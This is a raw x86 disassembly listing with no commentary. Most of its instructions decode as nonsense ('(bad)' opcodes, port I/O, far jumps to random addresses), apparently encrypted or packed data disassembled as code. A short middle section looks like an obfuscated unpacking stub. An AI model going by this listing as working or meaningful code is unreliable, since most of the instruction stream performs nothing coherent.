  421a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a6c:	lods   al,BYTE PTR ds:[esi]
  421a6d:	rcr    ecx,0x84
  421a70:	in     eax,dx
  421a71:	pop    ecx
  421a72:	scas   al,BYTE PTR es:[edi]
  421a73:	(bad)  
  421a74:	icebp  
  421a75:	iret   
  421a76:	cmp    eax,0x29d4ff7
  421a7b:	(bad)  
  421a7c:	mov    ecx,0x9b6b2971
  421a81:	fdivp  st(2),st
  421a83:	ins    DWORD PTR es:[edi],dx
  421a84:	popa   
  421a85:	and    DWORD PTR [ebp-0x15],0x582cdd51
  421a8c:	test   BYTE PTR [esi-0x46eb3f93],ah
  421a92:	xchg   al,ch
  421a94:	or     al,ah
  421a96:	push   esi
  421a97:	mov    ds:0x96b340e,eax
  421a9c:	or     dh,BYTE PTR [eax+0x7c]
  421a9f:	ss clc 
  421aa1:	fcmovbe st,st(4)
  421aa3:	jp     0x421b24
  421aa5:	adc    BYTE PTR [edi],al
  421aa7:	sbb    eax,0xdef37b8
  421aac:	jmp    0x50088a38
  421ab1:	sbb    bh,BYTE PTR [ecx+0x6714a3a5]
  421ab7:	mov    bh,0x14
  421ab9:	adc    BYTE PTR [ebx-0x7b],dl
  421abc:	fsubp  st(5),st
  421abe:	ins    BYTE PTR es:[edi],dx
  421abf:	push   esp
  421ac0:	gs in  al,dx
  421ac2:	(bad)  
  421ac4:	or     edx,DWORD PTR [ebx]
  421ac6:	pop    ds
  421ac7:	add    al,0xe1
  421ac9:	mov    eax,ds:0xb43023b5
  421ace:	ss icebp 
  421ad0:	adc    eax,0xba61f39e
  421ad5:	mov    esp,0xaac93340
  421ada:	cs jno 0x421b31
  421add:	jmp    0xfaaeb632
  421ae2:	shl    DWORD PTR [edx+0x6a391f8b],1
  421ae8:	data16 jnp 0x421b04
  421aeb:	mov    esi,0x45b7cca8
  421af0:	jbe    0x421ab0
  421af2:	cdq    
  421af3:	mov    ds,WORD PTR ds:0xbcca186e
  421af9:	mov    ?,eax
  421afb:	sbb    eax,0x4ac036f6
  421b00:	and    cl,BYTE PTR [ebx+0x2f]
  421b03:	fnstsw WORD PTR [edi-0x12]
  421b06:	lock fsub QWORD PTR [eax]
  421b09:	popa   
  421b0a:	ds loope 0x421b6a
  421b0d:	pop    ss
  421b0e:	mov    edi,0x8f571563
  421b13:	or     BYTE PTR [ecx],0xb8
  421b16:	aaa    
  421b17:	xchg   ecx,eax
  421b18:	mov    edx,0x59cf82cd
  421b1d:	test   eax,0xccb2bb44
  421b22:	mov    esi,0x1972af7
  421b27:	daa    
  421b28:	jmp    0x421b6f
  421b2a:	and    DWORD PTR [edi+0xde7754f],edi
  421b30:	mov    edi,0x29dde934
  421b35:	in     al,dx
  421b36:	inc    esi
  421b37:	call   0x2abc:0x3966b101
  421b3e:	and    eax,0x3809a8b0
  421b43:	dec    esp
  421b44:	lahf   
  421b45:	mov    DWORD PTR [edi-0x5f],edx
  421b48:	add    eax,0xcd2bdfd7
  421b4d:	popa   
  421b4e:	sbb    dh,BYTE PTR [ecx]
  421b50:	mov    ds:0xf1ec0178,eax
  421b55:	(bad)  
  421b56:	jle    0x421ae2
  421b58:	in     al,0xbb
  421b5a:	les    esi,FWORD PTR [ebp-0x56fcc18]
  421b60:	jae    0x421b83
  421b62:	and    ah,cl
  421b64:	xor    edx,DWORD PTR [esi-0x11]
  421b67:	or     esi,0x37c48fd1
  421b6d:	jbe    0x421b33
  421b6f:	out    dx,eax
  421b70:	add    eax,0xb1d752a6
  421b76:	mov    al,0xd3
  421b78:	leave  
  421b79:	add    BYTE PTR [edx+eax*8],0x66
  421b7d:	mov    esp,0x4a457de7
  421b82:	xlat   BYTE PTR ds:[ebx]
  421b83:	jns    0x421bec
  421b85:	fist   DWORD PTR [esi+0x38]
  421b88:	add    eax,0xd7ed2d8f
  421b8d:	in     al,0x0
  421b8f:	out    0x82,eax
  421b91:	inc    edx
  421b92:	jg     0x421b7b
  421b94:	jmp    0x421bc4
  421b96:	int    0x96
  421b98:	setp   BYTE PTR [ebx+0x55]
  421b9c:	mov    dl,0xfa
  421b9e:	test   DWORD PTR [ecx+0xe],edx
  421ba1:	icebp  
  421ba2:	shr    DWORD PTR [ecx+0x3a],0x29
  421ba6:	pop    eax
  421ba7:	push   ebp
  421ba8:	adc    esp,esp
  421baa:	xlat   BYTE PTR ds:[ebx]
  421bab:	inc    esi
  421bac:	scas   al,BYTE PTR es:[edi]
  421bad:	inc    esp
  421bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421baf:	int3   
  421bb0:	imul   ebx,ebx,0x266edea3
  421bb6:	aas    
  421bb7:	push   ds
  421bb8:	mov    dh,BYTE PTR [ecx+ebx*2]
  421bbb:	(bad)  
  421bbc:	into   
  421bbd:	fstp   QWORD PTR [edx]
  421bbf:	jmp    0xa7473e7b
  421bc4:	in     al,dx
  421bc5:	dec    ebx
  421bc6:	outs   dx,BYTE PTR ds:[esi]
  421bc7:	cdq    
  421bc8:	pminub mm6,mm4
  421bcb:	icebp  
  421bcc:	into   
  421bcd:	(bad)
  421bd0:	jg     0x421c34
  421bd2:	adc    DWORD PTR [edx],esi
  421bd4:	aam    0x2f
  421bd6:	enter  0x3f6f,0x50
  421bda:	sbb    DWORD PTR [ebp-0x69],eax
  421bdd:	or     DWORD PTR [ecx+0x7ba9539d],ecx
  421be3:	jle    0x421b7d
  421be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421be6:	or     al,0xbc
  421be8:	dec    esi
  421be9:	add    DWORD PTR [edi-0x8],eax
  421bec:	sti    
  421bed:	scas   al,BYTE PTR es:[edi]
  421bee:	out    0x43,eax
  421bf0:	sbb    ch,bl
  421bf2:	jns    0x421c1d
  421bf4:	out    dx,eax
  421bf5:	dec    ebp
  421bf6:	scas   al,BYTE PTR es:[edi]
  421bf7:	or     ah,bl
  421bf9:	xor    ecx,DWORD PTR [eax-0x7ed08326]
  421bff:	stos   BYTE PTR es:[edi],al
  421c00:	out    0xf5,eax
  421c02:	add    al,0x76
  421c04:	rol    esi,0x68
  421c07:	and    al,0x87
  421c09:	mov    ebp,0x119bd6de
  421c0e:	test   eax,0x27a09cda
  421c13:	pop    edi
  421c14:	mov    ah,0x2
  421c16:	das    
  421c17:	push   ds
  421c18:	jmp    0x8f8d:0x57012f65
  421c1f:	or     al,0xbc
  421c21:	stos   DWORD PTR es:[edi],eax
  421c22:	push   eax
  421c23:	bound  esi,QWORD PTR [edi]
  421c25:	push   ss
  421c26:	(bad)  
  421c27:	or     DWORD PTR [edx-0x4e],edx
  421c2a:	inc    edx
  421c2b:	inc    DWORD PTR [edx+esi*4+0x50eb6dbd]
  421c32:	mov    ecx,0x9dbba0f2
  421c37:	mov    ds:0x62eec2ce,eax
  421c3c:	xchg   edx,eax
  421c3d:	imul   ecx,esp,0xffffffce
  421c40:	popa   
  421c41:	lea    esi,[esi-0x40c51484]
  421c47:	and    eax,0x339758da
  421c4c:	mov    esp,0x35234da9
  421c51:	dec    edi
  421c52:	jp     0x421c38
  421c54:	rcr    BYTE PTR [edi-0x3a74b12],cl
  421c5a:	or     ebp,ebx
  421c5c:	mov    ebx,0x81a943a0
  421c61:	mov    BYTE PTR [esi-0x7e85787b],bl
  421c67:	div    cl
  421c69:	out    0x28,al
  421c6b:	je     0x421c89
  421c6d:	into   
  421c6e:	mov    cl,0x43
  421c70:	lock mov edi,0x65a4c67c
  421c76:	je     0x421c03
  421c78:	bound  edx,QWORD PTR [eax+0x643325a0]
  421c7e:	mov    cs,WORD PTR [eax-0x50]
  421c81:	test   BYTE PTR [ecx+0x102a0f53],cl
  421c87:	adc    bh,BYTE PTR [eax+0x40]
  421c8a:	push   0x9ff4723f
  421c8f:	push   ss
  421c90:	retf   0x8149
  421c93:	mov    esp,edi
  421c95:	sbb    ch,BYTE PTR [ebx-0x31]
  421c98:	xchg   ebp,eax
  421c99:	fbld   TBYTE PTR [edi+0x48ca3c9c]
  421c9f:	aas    
  421ca0:	adc    bh,BYTE PTR [ebp-0x1c68b469]
  421ca6:	test   DWORD PTR [edx-0x2c2a402b],ecx
  421cac:	mov    bl,0x93
  421cae:	cmp    dl,0x9c
  421cb1:	sahf   
  421cb2:	xlat   BYTE PTR ds:[ebx]
  421cb3:	or     eax,0xcbc1f87e
  421cb8:	fmul   DWORD PTR [edx-0x5a48beab]
  421cbe:	xchg   ecx,eax
  421cbf:	adc    BYTE PTR [edi],0x5b
  421cc2:	dec    eax
  421cc3:	jae    0x421d33
  421cc5:	and    eax,0xffb287ae
  421cca:	outs   dx,DWORD PTR ds:[esi]
  421ccb:	mov    esp,0x329ab20d
  421cd0:	xchg   BYTE PTR [ecx+0x2],cl
  421cd3:	ja     0x421cf1
  421cd5:	fadd   DWORD PTR ss:0xe900b396
  421cdc:	daa    
  421cdd:	sar    DWORD PTR [esi],1
  421cdf:	add    al,0x13
  421ce1:	xchg   esp,eax
  421ce2:	ins    BYTE PTR es:[edi],dx
  421ce3:	lock push es
  421ce5:	cmp    DWORD PTR [edi+0x61c55c99],edx
  421ceb:	not    BYTE PTR gs:[ebp+edx*1+0x5a]
  421cf0:	sbb    al,0xa
  421cf2:	jmp    0x421cc3
  421cf4:	adc    al,0xb5
  421cf6:	xor    al,0x5a
  421cf8:	(bad)  
  421cf9:	in     al,dx
  421cfa:	stc    
  421cfb:	icebp  
  421cfc:	and    ebp,DWORD PTR [edx-0x3]
  421cff:	sar    BYTE PTR [edi-0x67],1
  421d02:	mov    edx,DWORD PTR [ebx+eiz*2-0x732bd544]
  421d09:	cmp    eax,0x1b572847
  421d0e:	adc    bh,ah
  421d10:	gs mov bh,0x32
  421d13:	je     0x421d23
  421d15:	neg    bl
  421d17:	mov    eax,ds:0xe9c90c
  421d1c:	ds addr16 dec edx
  421d1f:	cmp    ebx,esi
  421d21:	cmp    dl,ch
  421d23:	xor    bh,0x48
  421d26:	fldcw  WORD PTR [edi+0x7801a27a]
  421d2c:	rol    DWORD PTR [ebp-0x7f],cl
  421d2f:	cwde   
  421d30:	adc    al,0xca
  421d32:	mov    ch,0x9e
  421d34:	enter  0x661d,0x79
  421d38:	cwde   
  421d39:	in     eax,0x4c
  421d3b:	push   ecx
  421d3c:	fs sub bl,dh
  421d3f:	pop    edx
  421d40:	xchg   edx,eax
  421d41:	add    al,0x51
  421d43:	lahf   
  421d44:	jo     0x421d68
  421d46:	and    eax,0x4a4ed7f3
  421d4b:	jne    0x421d51
  421d4d:	push   esp
  421d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d4f:	rcl    BYTE PTR [eax+eax*1-0x534f3c5e],1
  421d56:	leave  
  421d57:	mov    DWORD PTR [esi+ebp*2],ebp
  421d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d5b:	and    al,0x7e
  421d5d:	and    ch,BYTE PTR [edx-0x4d]
  421d60:	inc    esi
  421d61:	iret   
  421d62:	add    edi,DWORD PTR [ecx+ebx*4+0x14]
  421d66:	ins    DWORD PTR es:[edi],dx
  421d67:	inc    eax
  421d68:	or     BYTE PTR [eax-0x6d],dh
  421d6b:	mov    esp,0x1793b414
  421d70:	loope  0x421d11
  421d72:	das    
  421d73:	imul   esi,edi,0xffffff97
  421d76:	pop    esi
  421d77:	loope  0x421dce
  421d79:	cs dec esp
  421d7b:	aaa    
  421d7c:	push   edx
  421d7d:	xor    edx,edi
  421d7f:	leave  
  421d80:	fwait
  421d81:	add    ebx,DWORD PTR [ebp+0x32]
  421d84:	xlat   BYTE PTR ds:[ebx]
  421d85:	in     eax,dx
  421d86:	pop    eax
  421d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d88:	mov    ds:0xacac3503,al
  421d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d8e:	mov    eax,ds:0x1b26c890
  421d93:	fwait
  421d94:	cs cmp ah,bl
  421d97:	imul   ebp,DWORD PTR [edx+ebp*1],0xb6263c26
  421d9e:	(bad)  
  421d9f:	jns    0x421db9
  421da1:	inc    eax
  421da2:	out    dx,eax
  421da3:	loop   0x421d4b
  421da5:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421da7:	loop   0x421d86
  421da9:	jle    0x421dbf
  421dab:	inc    esp
  421dac:	shl    DWORD PTR [esi+0x43b1cfc2],cl
  421db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db3:	or     ebp,ebp
  421db5:	xchg   edi,eax
  421db6:	mul    DWORD PTR [ebx-0x20]
  421db9:	enter  0xcf5b,0x8f
  421dbd:	lods   eax,DWORD PTR ds:[esi]
  421dbe:	sbb    al,0x24
  421dc0:	jecxz  0x421e1d
  421dc2:	xlat   BYTE PTR ds:[ebx]
  421dc3:	add    ebp,eax
  421dc5:	aam    0x37
  421dc7:	test   DWORD PTR [ecx+0x52],ebp
  421dca:	jbe    0x421dff
  421dcc:	or     DWORD PTR [ebp+0x2bf87d25],0x4e19ac5e
  421dd6:	jns    0x421e46
  421dd8:	pop    edx
  421dd9:	mov    ecx,0x13ed338b
  421dde:	jnp    0x421e3a
  421de0:	inc    ebp
  421de1:	xor    DWORD PTR [edx+0x3cec92b5],0x1f3d51aa
  421deb:	loope  0x421e25
  421ded:	dec    esp
  421dee:	dec    esi
  421def:	ret    
  421df0:	lea    esp,[edx-0x56285025]
  421df6:	sbb    DWORD PTR [ebx],ecx
  421df8:	jnp    0x421dcd
  421dfa:	sbb    al,0x41
  421dfc:	push   0xffffffd5
  421dfe:	mov    eax,0xad8ed796
  421e03:	lds    ecx,FWORD PTR [ebp-0x14]
  421e06:	ret    
  421e07:	add    DWORD PTR [ebp+0x2f799267],ebp
  421e0d:	cmc    
  421e0e:	or     BYTE PTR [ecx-0x17e392cf],dh
  421e14:	lds    ecx,FWORD PTR [edi+0x49]
  421e17:	cmp    bh,cl
  421e19:	fs stc 
  421e1b:	pop    esi
  421e1c:	test   al,0xde
  421e1e:	push   ss
  421e1f:	ds jmp 0xd688:0x1e940043
  421e27:	xor    eax,0x6c1ce1f7
  421e2c:	xchg   ebx,eax
  421e2d:	cmp    eax,0x49e68658
  421e32:	aas    
  421e33:	mov    edx,0x365c6f16
  421e38:	push   ecx
  421e39:	sub    esp,ebx
  421e3b:	shl    eax,1
  421e3d:	imul   ecx,DWORD PTR [edx+0x72935401],0x3c
  421e44:	and    DWORD PTR [ecx-0x61],edi
  421e47:	adc    BYTE PTR [ebx-0x1c],0x97
  421e4b:	push   ebx
  421e4c:	test   DWORD PTR ds:0x895e9b9b,0x6086b3e
  421e56:	scas   al,BYTE PTR es:[edi]
  421e57:	mov    eax,0x2a7a8deb
  421e5c:	sahf   
  421e5d:	fadd   QWORD PTR [ebx-0x73]
  421e60:	sbb    esp,DWORD PTR [ebp+0x15]
  421e63:	xchg   BYTE PTR [ecx-0x79],dl
  421e66:	or     BYTE PTR [ebp+eiz*8-0x21],dh
  421e6a:	sub    BYTE PTR [esi+0x6664a130],cl
  421e70:	sbb    BYTE PTR [edi+0x7a10d688],bl
  421e76:	dec    esi
  421e77:	mov    ebp,0xbc765e5f
  421e7c:	ja     0x421eee
  421e7e:	out    0xfa,eax
  421e80:	sbb    al,0xfc
  421e82:	jecxz  0x421e48
  421e84:	adc    DWORD PTR [ebp+0x5],0xcc42d4b7
  421e8b:	aad    0x8c
  421e8d:	cmc    
  421e8e:	lea    edi,[edx]
  421e90:	and    al,0x5a
  421e92:	mov    DWORD PTR [ecx],0xfd1f8db0
  421e98:	shr    DWORD PTR [edx-0x24367a01],0xea
  421e9f:	jnp    0x421ef8
  421ea1:	addr16 aad 0x70
  421ea4:	retf   0x595e
  421ea7:	sub    edi,DWORD PTR [esi+0x1bda6b75]
  421ead:	pop    ecx
  421eae:	or     al,0x66
  421eb0:	xchg   ebp,eax
  421eb1:	call   0xa4f5:0x21e982fa
  421eb8:	xlat   BYTE PTR ds:[ebx]
  421eb9:	test   BYTE PTR [edx-0x172dff73],ch
  421ebf:	leave  
  421ec0:	shr    BYTE PTR [ecx-0x2d],1
  421ec3:	ret    
  421ec4:	jmp    0x59d317ae
  421ec9:	mov    cs,WORD PTR ds:0x88f2b035
  421ecf:	dec    ecx
  421ed0:	sbb    ebp,DWORD PTR [esi]
  421ed2:	lea    esp,[ebx-0x5d]
  421ed5:	into   
  421ed6:	push   edi
  421ed7:	rol    BYTE PTR [ebx+0x47c90ca5],0x86
  421ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421edf:	js     0x421f35
  421ee1:	inc    edi
  421ee2:	pop    ebx
  421ee3:	sub    eax,0x5d6f6b07
  421ee8:	mov    ecx,0x905f5487
  421eed:	xlat   BYTE PTR ds:[ebx]
  421eee:	(bad)  
  421eef:	into   
  421ef0:	clc    
  421ef1:	mov    cs,WORD PTR [ecx+0x6ed01173]
  421ef7:	ss add eax,0xa90c849
  421efd:	jnp    0x421e84
  421eff:	aad    0xeb
  421f01:	cmp    DWORD PTR [ebx],0xffffffb9
  421f04:	push   edx
  421f05:	out    dx,al
  421f06:	(bad)  
  421f07:	mov    edi,0xc21c18cd
  421f0c:	test   DWORD PTR [eax+ecx*2],esp
  421f0f:	test   eax,0x2cf8ce40
  421f14:	scas   al,BYTE PTR es:[edi]
  421f15:	in     eax,0xd3
  421f17:	push   ds
  421f18:	bound  edi,QWORD PTR [edx-0x60]
  421f1b:	stc    
  421f1c:	nop
  421f1d:	or     al,0x11
  421f1f:	xchg   DWORD PTR [eax+0x6c],edi
  421f22:	dec    ecx
  421f23:	std    
  421f24:	cs push eax
  421f26:	xchg   dl,al
  421f28:	sub    ah,BYTE PTR [edx+0x10]
  421f2b:	repz je 0x421f38
  421f2e:	scas   al,BYTE PTR es:[edi]
  421f2f:	mov    ebp,0x5b5dca4f
  421f34:	(bad)  
  421f35:	mov    al,ds:0x91a727a8
  421f3a:	pop    eax
  421f3b:	loopne 0x421ed4
  421f3d:	gs mov bh,0x50
  421f40:	inc    eax
  421f41:	mov    dh,0x5d
  421f43:	jle    0x421f78
  421f45:	arpl   WORD PTR [edx],cx
  421f47:	scas   al,BYTE PTR es:[edi]
  421f48:	and    ebx,DWORD PTR [ebx-0x57]
  421f4b:	stc    
  421f4c:	ret    
  421f4d:	sbb    eax,DWORD PTR [edi+0x4d360e8]
  421f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f54:	xchg   esp,eax
  421f55:	es ins BYTE PTR es:[edi],dx
  421f57:	xchg   edx,eax
  421f58:	(bad)  
  421f59:	xchg   ecx,eax
  421f5a:	aas    
  421f5b:	adc    esi,DWORD PTR cs:[eax]
  421f5e:	inc    esp
  421f5f:	je     0x421f1e
  421f61:	pop    ebp
  421f62:	mov    ah,0xac
  421f64:	loopne 0x421f56
  421f66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f67:	mov    cl,BYTE PTR [edx]
  421f69:	daa    
  421f6a:	xor    ecx,eax
  421f6c:	add    ecx,esi
  421f6e:	jne    0x41d82d
  421f74:	mov    ecx,DWORD PTR [ebp-0x8]
  421f77:	xor    ecx,eax
  421f79:	mov    eax,DWORD PTR [ebp+0x10]
  421f7c:	add    ecx,esi
  421f7e:	mov    DWORD PTR [eax],ecx
  421f80:	pop    edi
  421f81:	pop    esi
  421f82:	pop    ebx
  421f83:	leave  
  421f84:	ret    0xc
  421f87:	push   ebp
  421f88:	mov    ebp,esp
  421f8a:	sub    esp,0x7c
  421f8d:	push   esi
  421f8e:	sbb    esi,esi
  421f90:	push   edi
  421f91:	mov    eax,ds:0x42f36b
  421f96:	adc    esi,esi
  421f98:	mov    DWORD PTR [ebp-0x24],eax
  421f9b:	and    eax,DWORD PTR ds:0x42b008
  421fa1:	mov    eax,ds:0x42f477
  421fa6:	adc    edi,0x31bd
  421fac:	mov    DWORD PTR [ebp-0x34],eax
  421faf:	mov    eax,ds:0x424aac
  421fb4:	mov    esi,DWORD PTR ds:0x424b44
  421fba:	sub    eax,esi
  421fbc:	or     eax,DWORD PTR [eax+esi*1]
  421fbf:	and    DWORD PTR [ebp-0x30],0x0
  421fc3:	sub    esi,DWORD PTR ds:0x42d014
  421fc9:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  421fd0:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  421fd7:	mov    eax,DWORD PTR [ebp-0x10]
  421fda:	mov    ecx,DWORD PTR [ebp-0x10]
  421fdd:	not    edi
  421fdf:	sub    eax,ecx
  421fe1:	mov    esi,DWORD PTR ds:0x429020
  421fe7:	xor    DWORD PTR ds:0x42a018,esi
  421fed:	mov    DWORD PTR [ebp-0x10],eax
  421ff0:	inc    DWORD PTR ds:0x42900c
  421ff6:	xor    DWORD PTR [ebp-0x10],0xf89cb5b0
  421ffd:	xor    edi,edi
  421fff:	xor    edi,DWORD PTR ds:0x42e004
  422005:	mov    edi,DWORD PTR [edi]
  422007:	sub    DWORD PTR ds:0x42901c,edi
  42200d:	mov    eax,DWORD PTR [ebp-0x18]
  422010:	mov    DWORD PTR ds:0x429028,0x1d
  42201a:	cmp    DWORD PTR ds:0x429028,0x0
  422021:	je     0x422077
  422027:	cmp    DWORD PTR ds:0x429028,0x4
  42202e:	jbe    0x422077
  422034:	jmp    0x422049
  422039:	push   0x1746
  42203e:	push   0x4baa
  422043:	call   DWORD PTR ds:0x430027
  422049:	cmp    DWORD PTR ds:0x429028,0x5
  422050:	jne    0x422063
  422056:	mov    esi,DWORD PTR ds:0x429028
  42205c:	dec    esi
  42205d:	mov    DWORD PTR ds:0x429028,esi
  422063:	xor    esi,esi
  422065:	add    esi,DWORD PTR ds:0x429028
  42206b:	dec    esi
  42206c:	mov    DWORD PTR ds:0x429028,esi
  422072:	jmp    0x42201a
  422077:	mov    ecx,DWORD PTR [ebp-0x18]
  42207a:	sub    eax,ecx
  42207c:	mov    DWORD PTR [ebp-0x18],eax
  42207f:	sub    edi,DWORD PTR ds:0x42d018
  422085:	or     DWORD PTR [ebp-0x18],0xf89f05b0
  42208c:	mov    eax,DWORD PTR [ebp-0xc]
  42208f:	mov    ecx,DWORD PTR [ebp-0xc]
  422092:	or     esi,0x5a7b
  422098:	sub    eax,ecx
  42209a:	mov    DWORD PTR [ebp-0xc],eax
  42209d:	jmp    0x422f1d
  4220a2:	lea    esp,[ebx-0x440791fa]
  4220a8:	test   DWORD PTR [ebx-0x537f27ca],eax
  4220ae:	fbld   TBYTE PTR [ecx-0x10]
  4220b1:	jae    0x4220ac
  4220b3:	mov    BYTE PTR [ebp+0x7a],bh
  4220b6:	pop    ds
  4220b7:	push   0xaf187a7a
  4220bc:	and    ch,BYTE PTR [ebx-0x15450a0]
  4220c2:	and    eax,0x3df7a59e
  4220c7:	xchg   DWORD PTR [ebx+0x54],esi
  4220ca:	rol    BYTE PTR [ecx-0x73d64899],0x7c
  4220d1:	out    0x36,eax
  4220d3:	cmc    
  4220d4:	jecxz  0x422093
  4220d6:	mov    esi,0xd1e06710
  4220db:	inc    eax
  4220dc:	jp     0x4220cc
  4220de:	jo     0x4220ca
  4220e0:	mov    ecx,DWORD PTR [edi]
  4220e2:	fldcw  WORD PTR [ebx]
  4220e4:	or     edi,ecx
  4220e6:	mov    cl,BYTE PTR [ebx+0xc]
  4220e9:	test   al,0x3a
  4220eb:	iret   
  4220ec:	les    ebp,FWORD PTR [ebx-0x38]
  4220ef:	in     eax,0x1c
  4220f1:	mov    ah,ch
  4220f3:	jmp    0xb132:0x35f6b235
  4220fa:	or     DWORD PTR [ecx+0x23394645],eax
  422100:	shl    DWORD PTR [edi+ebp*4-0x2d],0x25
  422105:	sbb    DWORD PTR [edx+0x6a72dac2],ebx
  42210b:	cmp    BYTE PTR [edi],bl
  42210d:	int    0x47
  42210f:	xor    al,0xc6
  422111:	loope  0x4220cc
  422113:	cmp    ecx,DWORD PTR [ecx+0x1e840e5e]
  422119:	xor    eax,0x5c495e6d
  42211e:	es pop esi
  422120:	scas   al,BYTE PTR es:[edi]
  422121:	out    dx,eax
  422122:	test   al,0xc
  422124:	in     eax,0x27
  422126:	or     esp,DWORD PTR [edx+ecx*4]
  422129:	sub    ch,bh
  42212b:	add    eax,0xf2280a59
  422130:	shr    DWORD PTR [eax],1
  422132:	das    
  422133:	inc    edx
  422134:	pop    edx
  422135:	aas    
  422136:	dec    esi
  422137:	dec    ebx
  422138:	in     al,dx
  422139:	mov    ah,0x47
  42213b:	jo     0x422129
  42213d:	dec    ebx
  42213e:	jle    0x422183
  422140:	pop    ebx
  422141:	ins    DWORD PTR es:[edi],dx
  422142:	pop    ss
  422143:	test   edi,0x85175014
  422149:	jmp    0x422188
  42214b:	ja     0x4220ef
  42214d:	mov    edx,0xe5cb55cc
  422152:	dec    edx
  422153:	pushf  
  422154:	or     edi,DWORD PTR [ebx]
  422156:	sub    eax,0xc0a00a5c
  42215b:	ret    
  42215c:	jmp    0xd0ee:0x121128f1
  422163:	arpl   WORD PTR [ecx-0x746bc21c],cx
  422169:	jmp    0x9110:0xd836739d
  422170:	cdq    
  422171:	xchg   edx,eax
  422172:	inc    esp
  422173:	mov    eax,0xf888d3aa
  422178:	je     0x42212c
  42217a:	in     al,dx
  42217b:	les    ecx,FWORD PTR [esi+0x6a]
  42217e:	jecxz  0x422134
  422180:	fucomip st,st(0)
  422182:	shl    DWORD PTR ds:0xe4817a43,0xf6
  422189:	nop
  42218a:	mov    al,BYTE PTR [esi-0x1efb31e1]
  422190:	xlat   BYTE PTR ds:[ebx]
  422191:	cmp    al,0x6d
  422193:	cmp    DWORD PTR [ebp+0x40],esi
  422196:	xor    eax,0xe995e15d
  42219b:	push   es
  42219c:	(bad)  
  42219e:	sub    BYTE PTR [eax],0x9e
  4221a1:	imul   ebx,DWORD PTR [ebx-0x7b0fea2c],0xffffff8f
  4221a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221a9:	mov    ?,edi
  4221ab:	pop    ecx
  4221ac:	push   edi
  4221ad:	add    eax,0x2fab55bc
  4221b2:	push   ds
  4221b3:	call   0x105768d9
  4221b8:	pop    esi
  4221b9:	mov    bl,BYTE PTR [ebp+0x7a70a88d]
  4221bf:	in     al,dx
  4221c0:	push   cs
  4221c1:	push   esp
  4221c2:	in     eax,dx
  4221c3:	pop    eax
  4221c4:	test   BYTE PTR [ebx],bl
  4221c6:	ins    BYTE PTR es:[edi],dx
  4221c7:	xchg   ebp,eax
  4221c8:	mov    ch,0xc0
  4221ca:	xor    al,cl
  4221cc:	lods   al,BYTE PTR ds:[esi]
  4221cd:	les    edx,FWORD PTR [esi]
  4221cf:	mov    bh,ch
  4221d1:	(bad)  
  4221d3:	and    dl,BYTE PTR [edi+0x54a39355]
  4221d9:	pop    ds
  4221da:	mov    cl,0xbd
  4221dd:	add    DWORD PTR [esi+0x8e055a1],0xa
  4221e4:	add    dh,bh
  4221e6:	shl    DWORD PTR ds:0xb68cfa0b,1
  4221ec:	push   ds
  4221ed:	or     DWORD PTR [ebx-0x35],edx
  4221f0:	mov    ch,0x7b
  4221f2:	outs   dx,BYTE PTR ds:[esi]
  4221f3:	xchg   esi,eax
  4221f4:	pop    esi
  4221f5:	inc    esi
  4221f6:	and    BYTE PTR [ebx-0x3d],bl
  4221f9:	xor    bh,BYTE PTR [ebx]
  4221fb:	cmp    bh,BYTE PTR [ecx]
  4221fd:	(bad)  
  4221fe:	aad    0x47
  422200:	add    BYTE PTR [ebx+0x1c],0xc5
  422204:	adc    eax,0x728243ee
  422209:	xchg   ebx,eax
  42220a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42220b:	out    dx,al
  42220c:	shr    BYTE PTR [ebx+0x4b],1
  42220f:	adc    DWORD PTR [ebp+0x73],eax
  422212:	nop
  422213:	mov    bh,0x3b
  422215:	std    
  422216:	push   ecx
  422217:	aam    0x0
  422219:	jno    0x4221e5
  42221b:	mov    eax,ds:0xfad8c719
  422220:	xchg   ecx,eax
  422221:	outs   dx,BYTE PTR ds:[esi]
  422222:	xchg   edx,eax
  422223:	mov    al,0xf5
  422225:	call   0x5720cd36
  42222a:	stc    
  42222b:	push   ecx
  42222c:	mov    ebx,0x86c000af
  422231:	mov    dl,0xff
  422233:	mov    eax,0xb4bf2318
  422238:	hlt    
  422239:	push   edx
  42223a:	jnp    0x42227d
  42223c:	shr    DWORD PTR [ebx-0x37],0x75
  422240:	cmp    ch,dh
  422242:	and    BYTE PTR [edi+0x3f90ee1a],dh
  422248:	out    dx,eax
  422249:	jo     0x4221cf
  42224b:	pop    ecx
  42224c:	(bad)  [edi]
  42224e:	or     edx,DWORD PTR [edi-0x3a08419c]
  422254:	jnp    0x4221eb
  422256:	(bad)  
  422257:	sbb    esp,DWORD PTR [ecx+0x3d]
  42225a:	or     DWORD PTR [esi],0x133b31f5
  422260:	cmp    bh,BYTE PTR [ecx-0x47]
  422263:	inc    edi
  422264:	jno    0x42224d
  422266:	mov    eax,ds:0xac37073c
  42226b:	dec    ecx
  42226c:	push   es
  42226d:	(bad)  
  42226e:	shr    DWORD PTR [ecx+0x3e],1
  422271:	xchg   esp,eax
  422272:	sub    BYTE PTR [ebx],dh
  422274:	sub    bh,ch
  422276:	stos   BYTE PTR es:[edi],al
  422277:	xchg   edi,eax
  422278:	stc    
  422279:	rcl    ebx,1
  42227b:	xchg   esi,eax
  42227c:	cwde   
  42227d:	and    esi,DWORD PTR [edi-0x6587976e]
  422283:	repnz and BYTE PTR ds:0x9deac1f6,dh
  42228a:	adc    esp,DWORD PTR [ecx+0x7]
  42228d:	jno    0x422229
  42228f:	mov    edi,0xd271b249
  422294:	scas   al,BYTE PTR es:[edi]
  422295:	mov    dh,0x2b
  422297:	push   cs
